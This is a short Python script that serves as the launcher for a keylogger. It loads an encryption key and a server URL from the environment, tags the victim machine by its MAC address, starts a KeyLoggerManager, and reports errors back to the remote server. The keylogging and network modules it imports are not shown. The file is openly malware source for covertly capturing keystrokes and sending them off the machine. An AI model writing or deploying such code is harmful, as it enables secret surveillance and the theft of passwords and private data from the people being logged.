from key_logger_manager import KeyLoggerManager
from os import getenv
from dotenv import load_dotenv
from getmac import get_mac_address
from network_writer import NetworkWriter


load_dotenv()
encryption_key = getenv("encryption_key")
url = getenv('URL')

mac_address = get_mac_address()
if not mac_address:
    NetworkWriter(url).send_error('Error: can not get mac address', 'unknown')
    raise RuntimeError

manager = KeyLoggerManager(5, mac_address, encryption_key, ['server'], url)

if __name__ == '__main__':
    try:
        manager.start()
    except Exception as e:
        NetworkWriter(url).send_error(e, mac_address)
